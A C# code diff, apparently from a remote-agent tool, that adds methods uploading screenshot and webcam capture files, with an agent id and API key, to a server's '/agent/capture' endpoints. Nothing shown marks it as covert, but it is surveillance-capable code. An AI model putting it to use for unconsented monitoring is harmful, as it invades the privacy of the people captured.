@@ -5,6 +5,10 @@ using System.Net.Http;
 using System.Text;
 using System.Windows.Forms;
 using WindowsFormsApp1;
+using System.IO;
+using System.Net.Http.Headers;
+using System.Net.Mime;
+using System.Web.UI.WebControls;
 
 namespace CSTool.Models
 {
@@ -68,6 +72,48 @@ namespace CSTool.Models
                 }
             }
 
+        }
+
+        public bool PostScreenshot(string filename)
+        {
+            return post("/agent/capture/sc/", filename); 
+        }
+        public bool PostCameraCapture(string filename)
+        {
+            return post("/agent/capture/wc/", filename); 
+        }
+        private bool post(string url, string fileAddress)
+        {
+            try
+            {
+                HttpClient client = new HttpClient();
+                MultipartFormDataContent form = new MultipartFormDataContent();
+                HttpContent content = new StringContent("fileToUpload");
+                client.DefaultRequestHeaders.Add("Authorization", Globals.apiKey);
+                form.Add(new StringContent(agent_id.ToString(), Encoding.UTF8, MediaTypeNames.Text.Plain), "agent");
+                form.Add(content, "fileToUpload");
+                var stream = new FileStream(fileAddress, FileMode.Open);
+                content = new StreamContent(stream);
+                var fileName = content.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
+                {
+                    Name = "snapshot",
+                    FileName = Path.GetFileName(fileAddress),
+                };
+                form.Add(content);
+                HttpResponseMessage response = null;
+                var _url = new Uri(string.Concat(Url.API_URL, url));
+                response = (client.PostAsync(_url, form)).Result;
+                if (response.IsSuccessStatusCode)
+                {
+                    return true;
+                }
+            }
+            catch
+            {
+                Globals.SaveToLogFile(string.Concat("Failed to upload: ", fileAddress), (int)LogType.Error);
+                return false;
+            }
+            return false;
         }
     }
 }
